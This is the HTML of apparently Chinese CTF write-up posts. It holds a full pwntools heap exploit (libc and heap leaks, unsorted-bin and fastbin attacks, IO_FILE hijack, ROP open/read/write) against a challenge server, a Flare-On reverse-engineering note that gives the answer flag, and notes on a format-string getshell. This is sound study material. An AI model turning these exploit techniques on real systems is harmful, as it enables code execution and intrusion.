class="line"></span><br><span class="line">sa(<span class="string">&quot;name?\n&quot;</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x1f</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf08</span>,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">edit(<span class="number">0x20</span>,<span class="string">&#x27;\0&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0xd1</span>))</span><br><span class="line">add(<span class="number">0x108</span>,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">libc.address = u64(p.recv(<span class="number">8</span>))-<span class="number">0x3c4c0a</span></span><br><span class="line">log.info(<span class="string">&quot;libc.address:&quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">__malloc_hook = libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;__malloc_hook:&quot;</span>+<span class="built_in">hex</span>(__malloc_hook))</span><br><span class="line">one = libc.address+<span class="number">0xf02a4</span></span><br><span class="line">log.info(<span class="string">&quot;one:&quot;</span>+<span class="built_in">hex</span>(one))</span><br><span class="line"></span><br><span class="line">de()</span><br><span class="line">edit(<span class="number">0x8</span>,p64(__malloc_hook-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x13</span>+p64(one))</span><br><span class="line"></span><br><span class="line">sa(<span class="string">&quot;choice &gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">sa(<span class="string">&quot;Size &gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">0x18</span>).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><ul>
<li><p>通过多个unsorted bin泄露libc和heap</p>
</li>
<li><p>构造unsortedBin attack 修改<code>global_max_fast</code></p>
</li>
<li><p>Fastbin attack到Stream的IO_FILE结构中，劫持<code>_IO_file_jumps</code></p>
</li>
<li><p>通过<code>setcontext</code>的gadgets做ROP实现ORW，即可打印flag</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#@Date: 2019-10-19 11:20:07</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">HOST,PORT = <span class="string">&quot;a139cb3d.gamectf.com&quot;</span>,<span class="string">&quot;15189&quot;</span></span><br><span class="line">p = remote(HOST,PORT,timeout=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./pwn&quot;)</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x, drop = <span class="literal">True</span>,timeout=<span class="number">1</span>)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,cnt</span>):</span><br><span class="line">    sla(<span class="string">&quot;Choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">&quot;index:\n&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;size:\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&quot;context:\n&quot;</span>,cnt)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&quot;Choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    sla(<span class="string">&quot;index:\n&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&quot;Choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    sla(<span class="string">&quot;index:\n&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&quot;Choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    sla(<span class="string">&quot;index:\n&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    ru(<span class="string">&quot;Done!\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leaking libc and heap</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x88</span>,<span class="string">&#x27;0&#x27;</span>*<span class="number">0x88</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x88</span>,<span class="string">&#x27;1&#x27;</span>*<span class="number">0x88</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0xe8</span>,<span class="string">&#x27;2&#x27;</span>*<span class="number">0xe8</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x88</span>,<span class="string">&#x27;3&#x27;</span>*<span class="number">0x88</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x88</span>,<span class="string">&#x27;4&#x27;</span>*<span class="number">0x88</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x88</span>,<span class="string">&#x27;flag\n&#x27;</span>)</span><br><span class="line">de(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">&quot;note[0]: &quot;</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\0&#x27;</span>))-<span class="number">0x3c4b78</span></span><br><span class="line">log.info(<span class="string">&quot;libc.address:&quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">_IO_list_all = libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;_IO_list_all:&quot;</span>+<span class="built_in">hex</span>(_IO_list_all))</span><br><span class="line"><span class="built_in">open</span> = libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;open:&quot;</span>+<span class="built_in">hex</span>(<span class="built_in">open</span>))</span><br><span class="line">read = libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;read:&quot;</span>+<span class="built_in">hex</span>(read))</span><br><span class="line">write= libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;write:&quot;</span>+<span class="built_in">hex</span>(write))</span><br><span class="line"></span><br><span class="line">de(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x88</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">ru(<span class="string">&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line">heap = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\0&#x27;</span>))-<span class="number">0x4d0</span></span><br><span class="line">log.info(<span class="string">&quot;heap:&quot;</span>+<span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line"><span class="comment"># unsorted bin attack</span></span><br><span class="line"></span><br><span class="line">de(<span class="number">3</span>)</span><br><span class="line">de(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x88</span>,<span class="number">2</span>*p64(<span class="number">0</span>)+p64(heap+<span class="number">0x248</span>)+p64(heap+<span class="number">0x250</span>)+p64(heap+<span class="number">0x240</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x118</span>,<span class="string">&#x27;\0&#x27;</span>*<span class="number">0x80</span>+p64(<span class="number">0x290</span>)+p64(<span class="number">0x90</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">de(<span class="number">4</span>)</span><br><span class="line">de(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;\0&#x27;</span>*<span class="number">0x78</span>+p64(<span class="number">0x91</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(libc.address+<span class="number">0x3c67e8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fastbin attack</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x318</span>,payload+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x88</span>,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">de(<span class="number">2</span>)</span><br><span class="line">de(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">prdi_ret = libc.address+<span class="number">0x21102</span></span><br><span class="line">prsi_ret = libc.address+<span class="number">0x202e8</span></span><br><span class="line">pprdx_ret = libc.address+<span class="number">0x101ffc</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rop</span></span><br><span class="line"></span><br><span class="line">payload = <span class="number">7</span>*p64(<span class="number">0</span>)+p64(prdi_ret) <span class="comment">#pop rdi;ret</span></span><br><span class="line">payload += p64(heap+<span class="number">0x570</span>)+p64(prsi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="built_in">open</span>)+p64(prdi_ret)+p64(<span class="number">4</span>)</span><br><span class="line">payload += p64(prsi_ret)+p64(heap+<span class="number">0x1000</span>)+p64(pprdx_ret)</span><br><span class="line">payload = payload.ljust(<span class="number">0x88</span>,<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x91</span>)+p64(<span class="number">0</span>)+p64(read)+p64(prdi_ret)+p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(prsi_ret)+p64(heap+<span class="number">0x1000</span>)+p64(pprdx_ret)+p64(<span class="number">0x91</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(write)</span><br><span class="line">payload += <span class="string">&#x27;\0&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">payload += p64(<span class="number">0xf1</span>)+p64(heap+<span class="number">0x9f</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x318</span>,payload+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake = <span class="number">2</span>*p64(<span class="number">0</span>)</span><br><span class="line">fake += <span class="number">0x1b</span>*p64(libc.address+<span class="number">0x47b75</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0xe8</span>,fake)</span><br><span class="line"></span><br><span class="line">payload1= <span class="string">&quot;\x00&quot;</span>+p64(heap+<span class="number">0x100</span>)+p64(libc.address+<span class="number">0xc96a6</span>)+<span class="number">5</span>*p64(<span class="number">0</span>)+p64(heap+<span class="number">0x360</span>)</span><br><span class="line">payload1+= <span class="number">9</span>*p64(<span class="number">0</span>)+p64(libc.address+<span class="number">0x353aa</span>)<span class="comment">#add rsp,0x38;ret</span></span><br><span class="line">add(<span class="number">13</span>,<span class="number">0xe8</span>,payload1+<span class="string">&#x27;\n&#x27;</span>) <span class="comment">#add rsp,0x38;ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># hijack file struct</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/10/25/2019%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BA%BF%E4%B8%8A%E8%B5%9B/" data-id="cuidmt50UpiK8a6RhaB6NY8hB" data-title="2019 巅峰极客 线上赛" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-2019flareonctf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/10/10/2019flareonctf/" class="article-date">
  <time class="dt-published" datetime="2019-10-10T03:07:10.000Z" itemprop="datePublished">2019-10-10</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/10/10/2019flareonctf/">2019 FlareOntf</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id=""><a href="#" class="headerlink" title=""></a></h2><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">FireButton_Click</span>(<span class="params"><span class="built_in">object</span> **sender**, EventArgs **e**</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">this</span>.codeTextBox.Text == <span class="string">&quot;RAINBOW&quot;</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">this</span>.fireButton.Visible = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">this</span>.codeTextBox.Visible = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">this</span>.armingCodeLabel.Visible = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">this</span>.invalidWeaponLabel.Visible = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">this</span>.WeaponCode = <span class="keyword">this</span>.codeTextBox.Text;</span><br><span class="line">    <span class="keyword">this</span>.victoryAnimationTimer.Start();</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">this</span>.invalidWeaponLabel.Visible = <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">this</span>.codeTextBox.Text = <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> private bool isValidWeaponCode(string **s**)</span><br><span class="line">&#123;</span><br><span class="line">  char[] array = **s**.ToCharArray();</span><br><span class="line">  int length = **s**.Length;</span><br><span class="line">  for (int i = 0; i &lt; length; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    char[] expr_19_cp_0 = array;</span><br><span class="line">    int expr_19_cp_1 = i;</span><br><span class="line">    expr_19_cp_0[expr_19_cp_1] ^= &#x27;A&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line">  return array.*SequenceEqual*(new char[]</span><br><span class="line">  &#123;</span><br><span class="line">    &#x27;\u0003&#x27;,</span><br><span class="line">    &#x27; &#x27;,</span><br><span class="line">    &#x27;&amp;&#x27;,</span><br><span class="line">    &#x27;$&#x27;,</span><br><span class="line">    &#x27;-&#x27;,</span><br><span class="line">    &#x27;\u001e&#x27;,</span><br><span class="line">    &#x27;\u0002&#x27;,</span><br><span class="line">    &#x27; &#x27;,</span><br><span class="line">    &#x27;/&#x27;,</span><br><span class="line">    &#x27;/&#x27;,</span><br><span class="line">    &#x27;.&#x27;,</span><br><span class="line">    &#x27;/&#x27;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>




<pre><code>  private bool isValidWeaponCode(string **s**)
 {
   char[] array = **s**.ToCharArray();
   int length = **s**.Length;
   for (int i = 0; i &lt; length; i++)
   {
     char[] expr_19_cp_0 = array;
     int expr_19_cp_1 = i;
     expr_19_cp_0[expr_19_cp_1] ^= &#39;A&#39;;
   }
   return array.*SequenceEqual*(new char[]
   {
     &#39;\u0003&#39;,
     &#39; &#39;,
     &#39;&amp;&#39;,
     &#39;$&#39;,
     &#39;-&#39;,
     &#39;\u001e&#39;,
     &#39;\u0002&#39;,
     &#39; &#39;,
     &#39;/&#39;,
     &#39;/&#39;,
     &#39;.&#39;,
     &#39;/&#39;
   });
 }
</code></pre>
<p><code>Kitteh_save_galixy@flare-on.com</code></p>
<h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __stdcall <span class="title function_">start</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> Text[<span class="number">128</span>]; <span class="comment">// [esp+0h] [ebp-84h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// [esp+80h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v4 = sub_D21160(Text, byte_D22008, <span class="number">0x3Cu</span>);</span><br><span class="line">  v7 = v4;</span><br><span class="line">  Text[v4] = <span class="number">0</span>;</span><br><span class="line">  MessageBoxA(<span class="number">0</span>, Text, Caption, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>UTF-8</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">sub_D21000</span><span class="params">(_BYTE *a1, <span class="type">char</span> *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v3; <span class="comment">// [esp+0h] [ebp-8h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+4h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">signed</span> <span class="type">int</span>)(<span class="type">unsigned</span> __int8)*a2 &gt;&gt; <span class="number">3</span> == <span class="number">30</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = a2[<span class="number">3</span>] &amp; <span class="number">0x3F</span> | ((a2[<span class="number">2</span>] &amp; <span class="number">0x3F</span>) &lt;&lt; <span class="number">6</span>) | ((a2[<span class="number">1</span>] &amp; <span class="number">0x3F</span>) &lt;&lt; <span class="number">12</span>) | ((*a2 &amp; <span class="number">7</span>) &lt;&lt; <span class="number">18</span>);</span><br><span class="line">    v3 = <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( (<span class="type">signed</span> <span class="type">int</span>)(<span class="type">unsigned</span> __int8)*a2 &gt;&gt; <span class="number">4</span> == <span class="number">14</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = a2[<span class="number">2</span>] &amp; <span class="number">0x3F</span> | ((a2[<span class="number">1</span>] &amp; <span class="number">0x3F</span>) &lt;&lt; <span class="number">6</span>) | ((*a2 &amp; <span class="number">0xF</span>) &lt;&lt; <span class="number">12</span>);</span><br><span class="line">    v3 = <span class="number">3</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( (<span class="type">signed</span> <span class="type">int</span>)(<span class="type">unsigned</span> __int8)*a2 &gt;&gt; <span class="number">5</span> == <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = a2[<span class="number">1</span>] &amp; <span class="number">0x3F</span> | ((*a2 &amp; <span class="number">0x1F</span>) &lt;&lt; <span class="number">6</span>);</span><br><span class="line">    v3 = <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">LOBYTE</span>(v4) = *a2;</span><br><span class="line">    v3 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = v4;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<img src="http://tacqiniu.jagger2zr.com/gogo/20191108/6mmwM2ANOWDo.png" alt="mark" style="zoom:50%;" />
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/10/10/2019flareonctf/" data-id="cuidcfuYnHXv-fa7RTq4O8Zle" data-title="2019 FlareOntf" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-2019看雪ctf-q2" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/07/25/2019%E7%9C%8B%E9%9B%AActf-q2/" class="article-date">
  <time class="dt-published" datetime="2019-07-25T03:07:10.000Z" itemprop="datePublished">2019-07-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/07/25/2019%E7%9C%8B%E9%9B%AActf-q2/">2019 看雪CTF Q2</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="1-神秘来信-✅"><a href="#1-神秘来信-✅" class="headerlink" title="1-神秘来信 ✅"></a>1-神秘来信 ✅</h2><p>触发success的分支在异常处理中，所以需要触发异常处理<br>在汇编中可以考虑另esi&#x3D;0,从而</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">div esi</span><br></pre></td></tr></table></figure>
<p>除0操作，进而触发异常，从而推算满足条件的字符串为</p>
<p><em>前三位 相加 95  后三位指定值353</em></p>
<h2 id="3-金字塔的诅咒-✅"><a href="#3-金字塔的诅咒-✅" class="headerlink" title="3-金字塔的诅咒 ✅"></a>3-金字塔的诅咒 ✅</h2><p>典型的格式化字符串的洞，但是格式化串在.bss上</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">menu</span>();</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">    v3 = <span class="built_in">atoi</span>(&amp;buf);</span><br><span class="line">    <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;What do tou want to say:&quot;</span>);</span><br><span class="line">    <span class="built_in">read_input</span>(&amp;echo, <span class="number">24</span>);</span><br><span class="line">    <span class="built_in">printf</span>((<span class="type">const</span> <span class="type">char</span> *)&amp;echo);</span><br><span class="line">    <span class="built_in">puts</span>((<span class="type">const</span> <span class="type">char</span> *)&amp;unk_A97);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>format string 一向有ebp chain的方式，本题也不例外，虽然32bit程序的函数栈帧创建方式变为:</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">00000886</span>                 <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">esp</span>+<span class="number">4</span>]</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">.text:</span>0000098B                 <span class="keyword">lea</span>     <span class="built_in">esp</span>, [<span class="built_in">ecx</span>-<span class="number">4</span>]</span><br><span class="line"><span class="symbol">.text:</span>0000098E                 <span class="keyword">retn</span></span><br></pre></td></tr></table></figure>

<p>但在栈上仍旧留有环境变量的栈地址，进而将其可以作为跳转修改返回地址为one_gadgets，最后Getshell</p>
